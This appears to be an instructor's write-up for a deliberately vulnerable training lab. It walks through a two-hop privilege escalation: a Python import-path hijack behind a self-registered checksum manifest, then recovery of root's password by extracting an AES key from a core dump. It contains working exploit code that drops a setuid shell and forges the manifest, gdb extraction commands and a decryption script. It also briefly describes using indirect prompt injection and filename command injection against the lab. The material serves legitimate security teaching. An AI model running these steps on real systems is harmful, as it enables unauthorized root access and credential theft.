# Privilege escalation report: the two-hop chain, explained

**Audience:** you (lab author/instructor), as a standalone reference —
everything here is also covered piecemeal in
[vulnerable/privilege_escalation/README.md](../vulnerable/privilege_escalation/README.md)
and [docs/attack-timeline.md](attack-timeline.md) (Stages 11-12); this
report exists to walk through both hops end-to-end in one place,
including the fix applied in this session. **Instructor-only — do not
link this from student-facing pages.**

## The shape of the chain

Three accounts, two hops, no shortcuts:

```
appuser  --[ Hop 1 ]-->  opsuser  --[ Hop 2 ]-->  root
 (low)                    (mid)                   (high)
```

- `appuser` is where Stage 9's command-injection exploit lands you.
- `opsuser` has **no password and no way to log in directly** — the only
  way to ever act as `opsuser` is to succeed at Hop 1.
- `root` is reached only by succeeding at Hop 2, which uses `opsuser`
  access to recover root's actual account password.

Both hops are two-step on purpose: find and defeat a shallow defense,
then exploit the real bug underneath it. Neither hop is a sudo
misconfiguration you can fix by tightening a rule — both require spotting
a design flaw.

---

## Hop 1 — appuser → opsuser: import-path hijack behind a self-defeating integrity check

**Bug classes:** CWE-427 (Uncontrolled Search Path Element) + CWE-354
(Improper Validation of Integrity Check Value)

### What's actually there

`appuser` has exactly one sudo grant:

```
appuser ALL=(opsuser) NOPASSWD: /opt/shop/scripts/archive_worker.py *
```

`archive_worker.py` is root-owned and `appuser` can't edit it — but it's
world-readable, so `appuser` can read exactly what it does:

```python
sys.path.insert(0, OUTBOX_DIR)      # OUTBOX_DIR = /opt/shop/backups/outbox
module = __import__(handler_name)   # handler_name comes from argv
```

`OUTBOX_DIR` is owned by `appuser`. Because the script inserts an
`appuser`-writable directory at the *front* of the Python module search
path before importing a module by name, `appuser` can plant a file there
and have it imported — and since the script runs *as `opsuser`* (that's
what the sudo rule does), whatever top-level code that planted module
contains executes as `opsuser`.

**The shallow defense:** before importing, the script checks the planted
module's sha256 against a value recorded in `handlers.manifest`. This
looks like exactly the fix a security review would ask for once CWE-427
is spotted.

**Why it doesn't help:** `handlers.manifest` lives in the same
`appuser`-writable `OUTBOX_DIR` as the modules it's supposed to be
checking. `appuser` doesn't need to forge or crack anything — it writes
its malicious module, computes the real sha256 of that exact file, and
writes that real hash into the manifest itself. The check proves the
module wasn't swapped out *after* being registered; it proves nothing
about whether the registering party was ever allowed to.

### The exploit, step by step

1. `sudo -l` as `appuser` → shows exactly one rule (the one above). The
   only lead.
2. `cat /opt/shop/scripts/archive_worker.py` → see the `sys.path.insert`
   and the manifest check.
3. `ls -la /opt/shop/backups/outbox/` → `handlers.manifest` is
   `appuser`-owned, same as everything else there.
4. Plant a malicious handler and self-register it:
   ```bash
   cat > /opt/shop/backups/outbox/evil.py <<'EOF'
   import os
   os.system("cp /bin/bash /tmp/opsbash && chmod u+s /tmp/opsbash")
   EOF
   HASH=$(sha256sum /opt/shop/backups/outbox/evil.py | awk '{print $1}')
   python3 - "$HASH" <<'PYEOF'
   import json, sys
   p = "/opt/shop/backups/outbox/handlers.manifest"
   m = json.load(open(p))
   m["evil"] = sys.argv[1]
   json.dump(m, open(p, "w"))
   PYEOF
   ```
5. `sudo -u opsuser /opt/shop/scripts/archive_worker.py evil` → the
   planted module imports and runs as `opsuser`, dropping a setuid-opsuser
   shell at `/tmp/opsbash`.
6. `/tmp/opsbash -p` → now genuinely `opsuser`.

**Real-world analogue:** any "pluggable handler" or "plugin" system that
resolves code by name from a directory the lower-privileged caller can
write to, "protected" by a checksum stored in that same directory. The
lesson generalizes well beyond Python's `sys.path`.

---

## Hop 2 — opsuser → root: AES-256-GCM "encrypted at rest," scrubbed in exactly the wrong place

**Bug classes:** CWE-226 (Sensitive Information Uncleared Before Release,
applied *incompletely*) stacked on a CWE-320-style key-custody failure.

`opsuser` has **zero sudo rights** — `sudo -l` shows nothing. This hop is
not a trust-boundary/sudo bug at all; it's memory forensics plus a real
decrypt.

### What's actually there

`rootwatch` is a small, legacy "confirm the admin credential is still
correct" health-check tool (`vulnerable/privilege_escalation/rootwatch.c`),
installed root-owned and compiled with debug symbols kept in
(`-O0 -g`, never stripped). At startup it:

1. Reads `root_secret.enc` — root's real account password, encrypted with
   AES-256-GCM (nonce ‖ ciphertext ‖ tag).
2. Reads `root_secret.key` — the raw 32-byte AES key, from a **plain
   sibling file this same process reads directly off disk.** There is no
   KMS, vault, or hardware-backed key store anywhere in this design — the
   key is exactly as reachable as the ciphertext it unlocks.
3. Decrypts the password into a local buffer (`plaintext`) and "performs
   a local admin check" (a stand-in — the real content doesn't matter for
   the lab).
4. **Cleanses `plaintext` with `OPENSSL_cleanse()`** — this is the one
   thing it does correctly. The decrypted password itself does **not**
   survive to the end of the process.
5. Crashes deterministically (`abort()`), every single time, at build and
   reset time — not a live race. `setup_privesc.sh` runs this once under
   `gdb` and uses `generate-core-file` to capture a real ELF core dump,
   installed `opsuser`-owned, mode 440.

### Why the scrub doesn't save it

Step 4 closes the laziest possible attack: a plain `strings` pass over
the resulting core dump finds **no readable password** — `plaintext` is
gone by the time the crash happens.

But `key` and `blob` (the raw AES key, and the nonce‖ciphertext‖tag it
unlocks) are **never cleansed** — they're still completely intact,
sitting in the same stack frame, when the core dump is captured. This is
a deliberately realistic *partial* fix: whoever wrote the cleanup treated
the decrypted password as "the secret" worth protecting, and the
encryption key sitting right next to it as "just config" — even though
together `key` and `blob` reconstruct the password with zero
computational effort. This exact blind spot — scrub the obvious plaintext,
forget the key that unlocks it — shows up repeatedly in real incident
post-mortems.

### The exploit, step by step

1. `sudo -l` as `opsuser` → nothing. Have to enumerate more broadly than
   Hop 1 taught.
2. `ls -la /opt/shop/backups/` → `diagnostics/rootwatch.core`, owned
   `opsuser`, readable.
3. `file rootwatch.core` → it's an ELF core dump. A `strings` pass turns
   up fragments of `rootwatch`'s own argv and binary noise from `key`/
   `blob` — **but no readable password.** That dead end is itself the
   signal to switch from "grep harder" to real forensics.
4. Pull `key` and `blob` out by variable name with `gdb` (the binary
   isn't stripped):
   ```bash
   gdb -q -batch \
       -ex "frame function main" \
       -ex "dump binary memory key.bin  key  key+key_len" \
       -ex "dump binary memory blob.bin blob blob+blob_len" \
       /opt/shop/scripts/rootwatch/rootwatch \
       /opt/shop/backups/diagnostics/rootwatch.core
   ```
   The `frame function main` is not optional: at the `abort()` the innermost
   frame is `abort`/`raise`, where the locals `key`, `blob`, `key_len` and
   `blob_len` are not in scope — select `main`'s frame first or gdb answers
   "No symbol … in current context". `key` and `blob` are `unsigned char *`
   heap pointers (from `read_file`'s `malloc`), so dump the *pointed-to*
   bytes with `dump binary memory <file> <start> <end>`, not `print key`
   (which would only show the 8-byte pointer). `blob.bin` comes out as the
   whole on-disk blob: 12-byte nonce ‖ ciphertext ‖ 16-byte tag.
5. Decrypt. `openssl enc` does not do GCM tag verification, so use a real
   AEAD call — verified working:
   ```python
   from cryptography.hazmat.primitives.ciphers.aead import AESGCM
   key  = open("key.bin",  "rb").read()          # 32 bytes
   blob = open("blob.bin", "rb").read()
   print(AESGCM(key).decrypt(blob[:12], blob[12:], None).decode())
   ```
6. `su -` with the recovered password (it is root's real account password).
7. `cat /root/final_flag`.

**Real-world analogue:** a secret "encrypted at rest" whose key lives
beside it with no real custody (vault/HSM/KMS) — the same shape as a
Rails `master.key` sitting next to `credentials.yml.enc`, or an Ansible
vault-password-file stored beside the vault it unlocks — combined with a
code-review fix that scrubbed the one variable that *looked* dangerous
and missed the two that actually were.

---

## What changed in this session

The Hop 2 rework was implemented, then deployed and **verified end-to-end
against the live EC2 instance** (not just unit-tested). Along the way,
four real defects were found and fixed — three of them only because the
chain was actually run rather than read:

1. **Closed the `strings`-only shortcut.** `rootwatch` now cleanses
   `plaintext` with `OPENSSL_cleanse()` right after use but never touches
   `key`/`blob` — so recovering the password requires the real `gdb` +
   AEAD-decrypt path; a shallow `strings`/`grep` pass over the core dump
   no longer yields the password. Reflected across `rootwatch.c`,
   `tests/test_privilege_escalation.py`, `docs/attack-timeline.md`,
   `docs/defensive-controls.md`, and
   `vulnerable/privilege_escalation/README.md`.
2. **Fixed a build-breaking Dockerfile gap.** `gcc` alone does not pull in
   `libc6-dev` on the slim base image, so `rootwatch.c` failed to compile
   (`stdlib.h: No such file or directory`) and the whole image build
   aborted. Added `libc6-dev`.
3. **Fixed three live-test bugs** that a non-container run never exercises:
   a core-dump test that demanded group-unreadable (contradicting the
   lab's own 440 convention under a dedicated single-member group); a
   `/root/final_flag` test that errored instead of skipping when run
   unprivileged (`Path.exists()` raises `PermissionError`, not `False`,
   when `/root` blocks traversal); and a `passwd -S` test that only
   skipped when the account was absent, not when the caller lacked root.
   Full suite now: **28/28 as root, 26 pass / 2 skip as appuser**, inside
   the deployed container.
4. **Corrected the Hop 2 `gdb` command in the docs.** The earlier
   `print/x *(unsigned char(*)[32])key` could never have worked: at the
   `abort()` the selected frame is `abort`/`raise`, where `key`/`blob`
   are out of scope. The verified command selects `main`'s frame and dumps
   the pointed-to buffers (see the Hop 2 exploit steps above). `openssl
   enc` was also dropped from the decrypt step — it does not verify GCM
   tags — in favor of a real `AESGCM().decrypt(...)` call.

**Live end-to-end result (HTTP-only, authorized lab, box reset to pristine
afterward):** indirect prompt injection leaked the current catalog-sync
token → crafted-filename command injection gave `uid=1000(appuser)` → the
manifest-forging import hijack gave `uid=1001(opsuser)` and read the
stage-2 flag → core-dump key recovery + AESGCM decrypt yielded root's real
password → `su` returned `uid=0(root)` and read
`/root/final_flag` (`AI-LAB{root_via_rootwatch_coredump_aesgcm_key_recovery}`).
One delivery detail worth recording for anyone reproducing it externally:
the upload filename is the injected command, and `api_images`
`_weak_sanitize_filename` bans `/` and `..` while the filesystem caps a
filename at 255 bytes — so a large payload (both hops) must be delivered
by appending a `base32`-encoded copy to a staging file across many small
uploads, then decoded (`base32 -d`) and run. A single-shot filename only
fits a short command like the Stage-9 `id` proof.

## Rotation — explicitly not implemented

You asked not to implement a rotating root credential tied to the same
timer as Stage 6's service token, since it seemed unrealistic for this
context. Left untouched — root's password is generated once per
`setup_privesc.sh` run (image build / `reset_lab.sh`) and stays fixed for
the life of that container instance, same as before.
